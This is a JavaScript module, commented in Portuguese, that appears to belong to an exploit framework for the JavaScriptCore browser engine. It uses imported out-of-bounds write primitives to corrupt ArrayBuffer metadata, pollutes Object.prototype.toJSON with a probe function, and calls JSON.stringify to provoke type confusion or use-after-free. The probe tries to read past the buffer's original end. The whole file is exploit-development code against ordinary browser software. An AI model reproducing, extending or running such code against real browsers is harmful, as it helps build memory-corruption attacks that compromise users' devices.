// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, 
    oob_dataview_real, 
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Contador global, não usado ativamente pela toJSON_AttemptWriteToThis para evitar TypeError
export let current_toJSON_call_count_for_TypeError_test = 0;

// Esta é a toJSON que tentará escrever e ler em 'this'
export function toJSON_AttemptWriteToThis() {
    let result_payload = {
        toJSON_executed: "toJSON_AttemptWriteToThis",
        this_type: "N/A",
        this_byteLength_prop: "N/A", 
        dataview_created: false,
        written_value: null,
        read_back_value: null,
        write_match: false,
        error_in_toJSON: null,
        oob_read_attempt_val: "N/A", 
        oob_write_attempt_status: "N/A" 
    };

    try {
        result_payload.this_type = Object.prototype.toString.call(this);
        // Tenta ler o byteLength ANTES de qualquer outra operação que possa falhar
        try {
            result_payload.this_byteLength_prop = this.byteLength;
        } catch (e_bl) {
            result_payload.this_byteLength_prop = `Error accessing: ${e_bl.name} - ${e_bl.message}`;
            result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `ByteLength Access Error: ${e_bl.message}; `;
        }


        if (this instanceof ArrayBuffer) {
            let current_this_byteLength = this.byteLength; // Re-ler após instanceof para segurança, se o acesso anterior falhou
            if (typeof result_payload.this_byteLength_prop !== 'number') { // Se o primeiro acesso falhou, tente de novo
                 current_this_byteLength = "Error accessing or not a number";
            }


            if (typeof current_this_byteLength === 'number' && current_this_byteLength >= 4) {
                try {
                    let dv = new DataView(this); 
                    result_payload.dataview_created = true;
                    
                    const val_to_write = 0x41424344; // 'ABCD'
                    dv.setUint32(0, val_to_write, true); 
                    result_payload.written_value = toHex(val_to_write);
                    
                    result_payload.read_back_value = toHex(dv.getUint32(0, true));
                    
                    if (dv.getUint32(0, true) === val_to_write) {
                        result_payload.write_match = true;
                    }

                    // Tenta ler OOB somente se o byteLength percebido for maior que um tamanho "original" esperado.
                    // Para o oob_array_buffer_real, seu tamanho original é OOB_CONFIG.INITIAL_BUFFER_SIZE
                    // ou, mais genericamente, o tamanho com que foi criado em triggerOOB_primitive().
                    // Para este teste, vamos definir um original_expected_size com base no oob_array_buffer_real inicial,
                    // embora ele seja grande. A ideia é ver se byteLength foi corrompido para algo MAIOR.
                    const initial_oob_ab_size = OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE + 128; // Tamanho total de oob_array_buffer_real
                    const oob_read_offset = initial_oob_ab_size + 8; // Tentar ler 8 bytes além do fim *original*
                    
                    if (current_this_byteLength > initial_oob_ab_size && current_this_byteLength >= oob_read_offset + 4) {
                        try {
                            result_payload.oob_read_attempt_val = toHex(dv.getUint32(oob_read_offset, true));
                        } catch (e_oob_r) {
                             result_payload.oob_read_attempt_val = `Error reading @${toHex(oob_read_offset)}: ${e_oob_r.name}`;
                        }
                    } else if (current_this_byteLength <= initial_oob_ab_size) {
                        result_payload.oob_read_attempt_val = `Size not inflated (${current_this_byteLength}b), OOB read @${toHex(oob_read_offset)} not attempted.`;
                    } else {
                         result_payload.oob_read_attempt_val = `Inflated size (${current_this_byteLength}b) too small for OOB read @${toHex(oob_read_offset)}.`;
                    }


                } catch (e_dv) {
                    result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `DataView Op Error: ${e_dv.name} - ${e_dv.message}; `;
                }
            } else {
                result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `this (ArrayBuffer) size is invalid (size: ${current_this_byteLength}) for DV ops.`;
            }
        } else {
            result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + "this is not an ArrayBuffer.";
        }
    } catch (e_main) {
        result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `EXCEPTION_IN_toJSON: ${e_main.name} - ${e_main.message}; `;
        if (typeof result_payload.this_byteLength_prop === 'string' && result_payload.this_byteLength_prop.startsWith("Error accessing")) {
            // Não sobrescrever o erro de acesso ao byteLength se já ocorreu
        } else {
            result_payload.this_byteLength_prop = `Error during toJSON execution: ${e_main.message}`;
        }
    }
    
    return result_payload;
}

export async function executeFocusedTestForTypeError( 
    testDescription,
    toJSONFunctionToUse,
    valueToWriteOOB,         
    corruptionOffsetToTest,  
    bytesForInitialCorruption
) {
    const FNAME = `executeExploitAttempt<${testDescription}>`; 
    logS3(`--- Iniciando Teste de Exploração: ${testDescription} ---`, "test", FNAME);
    logS3(`    Corrupção Inicial OOB: Valor=${typeof valueToWriteOOB === 'object' ? valueToWriteOOB.toString(true) : toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)} (${bytesForInitialCorruption}b)`, "info", FNAME);
    document.title = `Iniciando: ${testDescription}`;

    current_toJSON_call_count_for_TypeError_test = 0;

    const ppKey_val = 'toJSON';

    await triggerOOB_primitive(); 
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME);
        document.title = "ERRO OOB Setup - " + FNAME;
        return { errorOccurred: new Error("OOB Setup Failed"), calls: 0, potentiallyCrashed: false, stringifyResult: null };
    }
    
    logS3(`    Buffer a ser Stringificado: oob_array_buffer_real (após setup e corrupção inicial)`, "info", FNAME);
    document.title = "OOB OK - " + FNAME;

    if (corruptionOffsetToTest !== null && valueToWriteOOB !== null) {
        logS3(`CORRUPÇÃO INICIAL: ${typeof valueToWriteOOB === 'object' ? valueToWriteOOB.toString(true) : toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)} no oob_array_buffer_real`, "warn", FNAME);
        document.title = `Antes OOB Write Meta (${toHex(corruptionOffsetToTest)})`;
        try {
            oob_write_absolute(corruptionOffsetToTest, valueToWriteOOB, bytesForInitialCorruption);
            logS3("Escrita OOB INICIAL feita.", "info", FNAME);
        } catch (e_oob_init) {
            logS3(`ERRO CRÍTICO na escrita OOB inicial: ${e_oob_init.message}`, "error", FNAME);
            clearOOBEnvironment();
            return { errorOccurred: e_oob_init, calls: 0, potentiallyCrashed: false, stringifyResult: null };
        }
    } else {
        logS3("Nenhuma corrupção inicial de metadados OOB especificada.", "info", FNAME);
    }
    
    let stepReached = "apos_escrita_oob_inicial";
    document.title = `Após OOB Write Meta (${toHex(corruptionOffsetToTest)})`;

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    // stepReached já foi definido acima
    let potentiallyCrashed = true;
    let errorCaptured = null;
    let stringifyResult = null;

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${ppKey_val} com função de sondagem...`, "info", FNAME);
        document.title = `Aplicando PP Exploit`;
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada.`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = `PP Exploit OK`;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify";
        document.title = `Antes Stringify oob_array_buffer_real`;
        logS3(`Chamando JSON.stringify no oob_array_buffer_real (potencialmente corrompido)...`, "info", FNAME);
        
        try {
            stringifyResult = JSON.stringify(oob_array_buffer_real); 
            stepReached = `apos_stringify`;
            potentiallyCrashed = false; 
            document.title = `Strfy oob_array_buffer_real OK`;
            logS3(`Resultado JSON.stringify: ${typeof stringifyResult === 'string' ? stringifyResult : JSON.stringify(stringifyResult)}`, "info", FNAME);
        } catch (e) {
            stepReached = `erro_stringify`;
            potentiallyCrashed = false; 
            errorCaptured = e;
            document.title = `ERRO Strfy oob_array_buffer_real (${e.name})`;
            logS3(`ERRO CAPTURADO JSON.stringify: ${e.name} - ${e.message}.`, "critical", FNAME);
            if (e.stack) logS3(`   Stack: ${e.stack}`, "error");
            console.error(`JSON.stringify ERROR (${testDescription}):`, e);
        }
    } catch (mainError) {
        potentiallyCrashed = false;
        errorCaptured = mainError;
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
        document.title = "ERRO Principal Exploit";
        if (mainError.stack) logS3(`   Stack: ${mainError.stack}`, "error");
        console.error("Main exploit test error:", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}.`, "info", FNAME);
        if (potentiallyCrashed) {
             document.title = `CONGELOU? ${stepReached}`;
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}.`, "error", FNAME);
        }
    }
    logS3(`--- Teste de Exploração Concluído: ${testDescription} ---`, "test", FNAME);
    if (!potentiallyCrashed && !errorCaptured) {
        document.title = `Teste Exploit OK - ${testDescription}`;
    } else if (errorCaptured && !document.title.startsWith("ERRO Strfy")) { 
        document.title = `ERRO Exploit (${errorCaptured.name}) - ${testDescription}`;
    }
    // O contador current_toJSON_call_count_for_TypeError_test não é relevante para toJSON_AttemptWriteToThis
    return { errorOccurred: errorCaptured, calls: 0, potentiallyCrashed, stringifyResult };
}
